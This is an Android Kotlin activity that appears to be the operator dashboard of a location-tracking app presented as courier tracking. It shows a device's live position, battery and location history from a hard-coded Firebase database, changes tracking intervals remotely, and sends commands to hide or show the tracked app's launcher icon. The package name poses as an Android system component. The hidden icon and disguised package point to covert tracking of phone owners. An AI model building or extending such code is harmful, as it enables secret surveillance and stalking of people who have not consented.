package com.android.system.manager

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.zIndex
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import com.google.android.gms.maps.CameraUpdateFactory
import com.google.android.gms.maps.GoogleMap
import com.google.android.gms.maps.MapView
import com.google.android.gms.maps.model.*
import com.google.firebase.database.*
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class CourierDetailActivity : ComponentActivity() {

    private lateinit var historyRef: DatabaseReference
    private lateinit var devicesRef: DatabaseReference

    data class LocationHistory(
        val lat: Double = 0.0,
        val lng: Double = 0.0,
        val bearing: Double = 0.0,
        val timestamp: Long = 0L,
        val accuracy: Double = 0.0,
        val speed: Double = 0.0,
        val altitude: Double = 0.0,
        val provider: String = "",
        val battery: Int = 0
    )

    data class LocationData(
        val lat: Double = 0.0,
        val lng: Double = 0.0,
        val accuracy: Float = 0f,
        val speed: Double = 0.0,
        val bearing: Double = 0.0,
        val altitude: Double = 0.0,
        val provider: String = "",
        val battery: Int = 0,
        val timestamp: Long = 0L
    )

    data class StatusData(
        val online: Boolean = false,
        val lastSeen: Long = 0L,
        val battery: Int = 0
    )

    data class DeviceData(
        val deviceId: String = "",
        val deviceName: String = "",
        val registeredAt: Long = 0L,
        val location: LocationData? = null,
        val status: StatusData? = null,
        val trackingConfig: Map<String, Any>? = null
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val deviceId = intent.getStringExtra("device_id") ?: ""
        val deviceName = intent.getStringExtra("device_name") ?: "Unknown Device"

        devicesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app").getReference("devices")
        historyRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("location_history").child(deviceId)

        setContent {
            CourierDetailScreen(deviceId = deviceId, deviceName = deviceName)
        }
    }

    @Composable
    private fun CourierDetailScreen(deviceId: String, deviceName: String) {
        var deviceData by remember { mutableStateOf<DeviceData?>(null) }
        var locationHistory by remember { mutableStateOf<List<LocationHistory>>(emptyList()) }
        var isLoading by remember { mutableStateOf(true) }
        val scope = rememberCoroutineScope()

        // Device control state
        var trackingEnabled by remember { mutableStateOf(true) }
        var intervalSeconds by remember { mutableStateOf(30) }
        var controlMessage by remember { mutableStateOf("") }
        var showControlPanel by remember { mutableStateOf(false) }
        var isLauncherHidden by remember { mutableStateOf(false) }

        // GoogleMap reference (set inside AndroidView factory)
        var googleMap by remember { mutableStateOf<GoogleMap?>(null) }
        val historyMarkers = remember { mutableMapOf<String, Marker>() }
        var polyline by remember { mutableStateOf<Polyline?>(null) }

        // Apply tracking config changes
        fun applyTrackingConfig() {
            val trackingConfig = mapOf(
                "trackingEnabled" to trackingEnabled,
                "intervalSeconds" to intervalSeconds.toLong()
            )
            devicesRef.child(deviceId).child("trackingConfig")
                .updateChildren(trackingConfig)
                .addOnSuccessListener {
                    controlMessage = "Settings applied successfully"
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
        }

        fun hideLauncherCommand() {
            devicesRef.child(deviceId).child("commands")
                .updateChildren(mapOf("hideLauncher" to true))
                .addOnSuccessListener {
                    isLauncherHidden = true
                    controlMessage = "Hide launcher command sent"
                    scope.launch { kotlinx.coroutines.delay(3000); controlMessage = "" }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    scope.launch { kotlinx.coroutines.delay(3000); controlMessage = "" }
                }
        }

        fun showLauncherCommand() {
            devicesRef.child(deviceId).child("commands")
                .updateChildren(mapOf("showLauncher" to true))
                .addOnSuccessListener {
                    isLauncherHidden = false
                    controlMessage = "Show launcher command sent"
                    scope.launch { kotlinx.coroutines.delay(3000); controlMessage = "" }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    scope.launch { kotlinx.coroutines.delay(3000); controlMessage = "" }
                }
        }

        // Helper: draw history on map
        fun drawHistoryOnMap(map: GoogleMap, history: List<LocationHistory>, device: DeviceData?) {
            historyMarkers.values.forEach { it.remove() }
            historyMarkers.clear()
            polyline?.remove()
            polyline = null

            if (history.isEmpty()) return

            val polylineOptions = PolylineOptions()
                .color(android.graphics.Color.BLUE)
                .width(5f)
                .geodesic(true)

            history.forEachIndexed { index, location ->
                val latLng = LatLng(location.lat, location.lng)
                polylineOptions.add(latLng)
                if (index % 10 == 0) {
                    val marker = map.addMarker(
                        MarkerOptions()
                            .position(latLng)
                            .title("Point ${index + 1}")
                            .snippet("${getRelativeTime(location.timestamp)} - ${location.provider}")
                            .icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_BLUE))
                    )
                    marker?.tag = "history_$index"
                    if (marker != null) historyMarkers["history_$index"] = marker
                }
            }

            polyline = map.addPolyline(polylineOptions)

            try {
                val boundsBuilder = LatLngBounds.Builder()
                history.forEach { boundsBuilder.include(LatLng(it.lat, it.lng)) }
                device?.let {
                    val lat = it.location?.lat ?: 0.0
                    val lng = it.location?.lng ?: 0.0
                    if (lat != 0.0 && lng != 0.0) {
                        boundsBuilder.include(LatLng(lat, lng))
                        val battery = it.status?.battery ?: it.location?.battery ?: 0
                        val provider = it.location?.provider ?: ""
                        map.addMarker(
                            MarkerOptions()
                                .position(LatLng(lat, lng))
                                .title("Current Location")
                                .snippet("Battery: ${battery}% | Provider: ${provider}")
                                .icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN))
                        )
                    }
                }
                val bounds = boundsBuilder.build()
                map.animateCamera(CameraUpdateFactory.newLatLngBounds(bounds, 100))
            } catch (e: Exception) {
                Log.e("DEBUG_DETAIL", "Camera bounds error: ${e.message}")
            }
        }

        // Listen for device data updates
        LaunchedEffect(deviceId) {
            devicesRef.child(deviceId).addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        // Parse DeviceData manually to avoid DatabaseException when
                        // nested fields (e.g. status) are stored as encrypted String
                        val deviceId2 = snapshot.child("deviceId").getValue(String::class.java) ?: ""
                        val deviceName2 = snapshot.child("deviceName").getValue(String::class.java) ?: ""
                        val registeredAt = snapshot.child("registeredAt").getValue(Long::class.java) ?: 0L

                        // Parse location
                        val locSnap = snapshot.child("location")
                        val location = try {
                            LocationData(
                                lat = locSnap.child("lat").getValue(Double::class.java) ?: 0.0,
                                lng = locSnap.child("lng").getValue(Double::class.java) ?: 0.0,
                                accuracy = locSnap.child("accuracy").getValue(Float::class.java) ?: 0f,
                                speed = locSnap.child("speed").getValue(Double::class.java) ?: 0.0,
                                bearing = locSnap.child("bearing").getValue(Double::class.java) ?: 0.0,
                                altitude = locSnap.child("altitude").getValue(Double::class.java) ?: 0.0,
                                provider = locSnap.child("provider").getValue(String::class.java) ?: "",
                                battery = locSnap.child("battery").getValue(Int::class.java) ?: 0,
                                timestamp = locSnap.child("timestamp").getValue(Long::class.java) ?: 0L
                            )
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "location parse error: ${e.message}") }
                            null
                        }

                        // Parse status — may be encrypted String or object
                        val statusSnap = snapshot.child("status")
                        val status = try {
                            StatusData(
                                online = statusSnap.child("online").getValue(Boolean::class.java) ?: false,
                                lastSeen = statusSnap.child("lastSeen").getValue(Long::class.java) ?: 0L,
                                battery = statusSnap.child("battery").getValue(Int::class.java) ?: 0
                            )
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "status parse error: ${e.message}") }
                            null
                        }

                        deviceData = DeviceData(
                            deviceId = deviceId2,
                            deviceName = deviceName2,
                            registeredAt = registeredAt,
                            location = location,
                            status = status
                        )
                    } catch (e: Exception) {
                        if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "DeviceData parse error: ${e.message}") }
                    }
                    Log.d("DEBUG_DETAIL", "Device data updated: ${deviceData?.deviceName}")
                }
                override fun onCancelled(error: DatabaseError) {
                    Log.e("DEBUG_DETAIL", "Device listener cancelled: ${error.message}")
                }
            })
        }

        // Load location history
        LaunchedEffect(deviceId) {
            isLoading = true
            historyRef.limitToLast(7).get()
                .addOnSuccessListener { snapshot ->
                    val history = mutableListOf<LocationHistory>()
                    snapshot.children.forEach { daySnapshot ->
                        daySnapshot.children.forEach { entrySnapshot ->
                            (entrySnapshot.value as? Map<*, *>)?.let { map ->
                                try {
                                    LocationHistory(
                                        lat = (map["lat"] as? Number)?.toDouble() ?: 0.0,
                                        lng = (map["lng"] as? Number)?.toDouble() ?: 0.0,
                                        accuracy = (map["accuracy"] as? Number)?.toDouble() ?: 0.0,
                                        speed = (map["speed"] as? Number)?.toDouble() ?: 0.0,
                                        bearing = (map["bearing"] as? Number)?.toDouble() ?: 0.0,
                                        altitude = (map["altitude"] as? Number)?.toDouble() ?: 0.0,
                                        provider = map["provider"] as? String ?: "",
                                        battery = (map["battery"] as? Number)?.toInt() ?: 0,
                                        timestamp = (map["timestamp"] as? Number)?.toLong() ?: 0L
                                    ).takeIf { it.lat != 0.0 }?.let { history.add(it) }
                                } catch (e: Exception) {
                                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "history entry parse error: ${e.message}") }
                                }
                            }
                        }
                    }
                    locationHistory = history.sortedBy { it.timestamp }
                    isLoading = false
                    // Draw on map if map is ready
                    googleMap?.let { map ->
                        drawHistoryOnMap(map, locationHistory, deviceData)
                    }
                    Log.d("DEBUG_DETAIL", "Location history loaded: ${history.size} points")
                }
                .addOnFailureListener { error ->
                    Log.e("DEBUG_DETAIL", "Failed to load history: ${error.message}")
                    isLoading = false
                }

            devicesRef.child(deviceId).child("trackingConfig").get()
                .addOnSuccessListener { snapshot ->
                    trackingEnabled = snapshot.child("trackingEnabled").getValue(Boolean::class.java) ?: true
                    intervalSeconds = snapshot.child("intervalSeconds").getValue(Long::class.java)?.toInt() ?: 30
                }
                .addOnFailureListener { error ->
                    Log.e("DEBUG_DETAIL", "Failed to load tracking config: ${error.message}")
                }
        }

        // When map becomes available and history is already loaded, draw it
        LaunchedEffect(googleMap, locationHistory) {
            val map = googleMap ?: return@LaunchedEffect
            if (locationHistory.isNotEmpty()) {
                drawHistoryOnMap(map, locationHistory, deviceData)
            }
        }

        val lifecycle = LocalLifecycleOwner.current.lifecycle

        Box(modifier = Modifier.fillMaxSize()) {
            // Map View — MapView created INSIDE factory lambda (GUIDE.md rule)
            AndroidView(
                factory = { ctx ->
                    MapView(ctx).also { mv ->
                        mv.onCreate(Bundle())
                        mv.onResume()
                        mv.getMapAsync { map ->
                            map.uiSettings.isZoomControlsEnabled = true
                            map.uiSettings.isCompassEnabled = true
                            map.moveCamera(
                                CameraUpdateFactory.newLatLngZoom(
                                    LatLng(41.299496, 69.240073), 10f
                                )
                            )
                            googleMap = map
                        }
                    }
                },
                update = { mv ->
                    // Lifecycle events handled via DisposableEffect below
                },
                modifier = Modifier.fillMaxSize()
            )

            // Top Bar
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp)
                    .align(Alignment.TopStart),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            IconButton(onClick = { finish() }) {
                                Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                            }
                            Spacer(modifier = Modifier.width(8.dp))
                            Column {
                                Text(
                                    text = deviceName,
                                    style = MaterialTheme.typography.titleMedium,
                                    fontWeight = FontWeight.Bold
                                )
                                Text(
                                    text = if (deviceData?.status?.online ?: false) "Online" else "Offline",
                                    fontSize = 12.sp,
                                    color = if (deviceData?.status?.online ?: false) Color.Green else Color.Red
                                )
                            }
                        }
                        if (isLoading) {
                            CircularProgressIndicator(modifier = Modifier.size(24.dp), strokeWidth = 2.dp)
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))
                    deviceData?.let { device -> DeviceInfoGrid(device) }
                }
            }

            // Device Control Section
            if (showControlPanel) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 16.dp, vertical = 8.dp)
                        .align(Alignment.CenterStart),
                    elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
                ) {
                    DeviceControlSection(
                        trackingEnabled = trackingEnabled,
                        intervalSeconds = intervalSeconds,
                        onTrackingEnabledChange = { trackingEnabled = it },
                        onIntervalChange = { intervalSeconds = it },
                        onApply = { applyTrackingConfig() },
                        isLauncherHidden = isLauncherHidden,
                        onHideLauncher = { hideLauncherCommand() },
                        onShowLauncher = { showLauncherCommand() },
                        message = controlMessage
                    )
                }
            }

            // Location History List
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(200.dp)
                    .padding(16.dp)
                    .align(Alignment.BottomStart),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                LocationHistoryList(history = locationHistory)
            }

            // Floating Settings Button
            IconButton(
                onClick = { showControlPanel = !showControlPanel },
                modifier = Modifier
                    .align(Alignment.TopEnd)
                    .padding(top = 80.dp, end = 16.dp)
                    .zIndex(10f)
                    .clip(CircleShape)
            ) {
                Icon(
                    imageVector = if (showControlPanel) Icons.Default.Close else Icons.Default.Settings,
                    contentDescription = if (showControlPanel) "Hide Control Panel" else "Show Control Panel",
                    tint = MaterialTheme.colorScheme.onSurface
                )
            }
        }
    }

    @Composable
    private fun DeviceInfoGrid(device: DeviceData) {
        Column {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                val battery = device.status?.battery ?: device.location?.battery ?: 0
                InfoItem("Battery", "${battery}%", Icons.Filled.Settings)
                val speed = device.location?.speed ?: 0.0
                InfoItem("Speed", "${speed.toInt()} km/h", Icons.Filled.LocationOn)
                val provider = device.location?.provider ?: ""
                InfoItem("Provider", provider.uppercase(), Icons.Filled.LocationOn)
            }
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                val accuracy = device.location?.accuracy ?: 0f
                InfoItem("Accuracy", "${accuracy}m", Icons.Filled.LocationOn)
                val lat = device.location?.lat ?: 0.0
                InfoItem("Lat", "%.6f".format(lat), Icons.Filled.LocationOn)
                val lng = device.location?.lng ?: 0.0
                InfoItem("Lng", "%.6f".format(lng), Icons.Filled.LocationOn)
            }
        }
    }

    @Composable
    private fun InfoItem(label: String, value: String, icon: androidx.compose.ui.graphics.vector.ImageVector) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(4.dp)
        ) {
            Icon(icon, contentDescription = null, modifier = Modifier.size(20.dp), tint = MaterialTheme.colorScheme.primary)
            Text(text = value, fontSize = 12.sp, fontWeight = FontWeight.Bold)
            Text(text = label, fontSize = 10.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    }

    @Composable
    private fun DeviceControlSection(
        trackingEnabled: Boolean,
        intervalSeconds: Int,
        onTrackingEnabledChange: (Boolean) -> Unit,
        onIntervalChange: (Int) -> Unit,
        onApply: () -> Unit,
        isLauncherHidden: Boolean,
        onHideLauncher: () -> Unit,
        onShowLauncher: () -> Unit,
        message: String
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text(
                text = "Device Control",
                style = MaterialTheme.typography.titleSmall,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.padding(bottom = 12.dp)
            )

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(text = "Tracking", style = MaterialTheme.typography.bodyMedium)
                Switch(checked = trackingEnabled, onCheckedChange = onTrackingEnabledChange)
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(text = "Update Interval", style = MaterialTheme.typography.bodyMedium)
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Slider(
                        value = intervalSeconds.toFloat(),
                        onValueChange = { onIntervalChange(it.toInt()) },
                        valueRange = 10f..300f,
                        steps = (300 - 10) / 10,
                        modifier = Modifier.width(120.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(text = "${intervalSeconds}s", style = MaterialTheme.typography.bodySmall, fontWeight = FontWeight.Bold)
                }
            }

            Spacer(modifier = Modifier.height(12.dp))

            Button(
                onClick = { if (isLauncherHidden) onShowLauncher() else onHideLauncher() },
                modifier = Modifier.fillMaxWidth().padding(top = 10.dp).zIndex(11f),
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isLauncherHidden) Color.Green else Color.Red,
                    contentColor = Color.White
                )
            ) {
                Text(if (isLauncherHidden) "Show Launcher" else "Hide Launcher")
            }

            Spacer(modifier = Modifier.height(8.dp))

            Button(onClick = onApply, modifier = Modifier.fillMaxWidth()) {
                Text("Apply")
            }

            if (message.isNotEmpty()) {
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = message,
                    style = MaterialTheme.typography.bodySmall,
                    color = if (message.contains("Error")) Color.Red else Color.Green
                )
            }
        }
    }

    @Composable
    private fun LocationHistoryList(history: List<LocationHistory>) {
        Column(modifier = Modifier.fillMaxSize()) {
            Text(
                text = "Location History (Last 50 points)",
                style = MaterialTheme.typography.titleSmall,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.padding(16.dp)
            )
            LazyColumn(modifier = Modifier.weight(1f)) {
                items(history.reversed()) { location ->
                    HistoryItem(location = location)
                }
            }
        }
    }

    @Composable
    private fun HistoryItem(location: LocationHistory) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 16.dp, vertical = 4.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(text = location.provider.uppercase(), fontSize = 12.sp, fontWeight = FontWeight.Medium)
                Text(
                    text = "Lat: ${location.lat}, Lng: ${location.lng}",
                    fontSize = 10.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
            }
            Column(horizontalAlignment = Alignment.End) {
                Text(text = getRelativeTime(location.timestamp), fontSize = 10.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                Text(text = "🔋 ${location.battery}%", fontSize = 8.sp, color = Color(0xFF4CAF50))
                Text(text = "⚡ ${location.speed.toInt()} km/h", fontSize = 8.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
            }
        }
    }

    private fun getRelativeTime(timestamp: Long): String {
        val now = System.currentTimeMillis()
        val diff = now - timestamp
        return when {
            diff < TimeUnit.MINUTES.toMillis(1) -> "Just now"
            diff < TimeUnit.MINUTES.toMillis(60) -> "${diff / TimeUnit.MINUTES.toMillis(1)} min ago"
            diff < TimeUnit.HOURS.toMillis(24) -> "${diff / TimeUnit.HOURS.toMillis(1)} hours ago"
            else -> "${diff / TimeUnit.DAYS.toMillis(1)} days ago"
        }
    }
}
